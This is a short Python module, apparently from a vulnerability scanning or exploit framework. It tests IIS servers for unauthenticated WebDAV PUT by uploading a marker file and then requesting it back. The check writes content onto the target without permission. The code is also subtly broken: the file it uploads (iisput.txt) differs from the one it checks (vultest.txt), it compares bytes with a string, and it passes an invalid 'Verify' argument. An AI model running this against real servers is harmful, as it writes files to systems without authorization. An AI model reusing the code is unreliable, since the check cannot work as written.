# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-08-27 18:34
from exploit.service.base import *


'''iis WebDav未授权，收集的'''

import socket
import time
import requests


def do(ip, port):
    Flag = False
    try:
        s = socket.socket()
        s.connect((ip, 80))
        s.send(b"PUT /iisput.txt HTTP/1.1\r\nHost: %s:%d\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (ip, port))
        time.sleep(1)
        data = s.recv(1024)
        s.close()
        if 'PUT' in data:
            url = 'http://' + ip + ":" + str(port) + '/vultest.txt'
            resp = requests.get(url, Verify=False)
            if 'xxscan0' in resp.text:
                Flag = True
    except:
        Flag = False
    return Flag
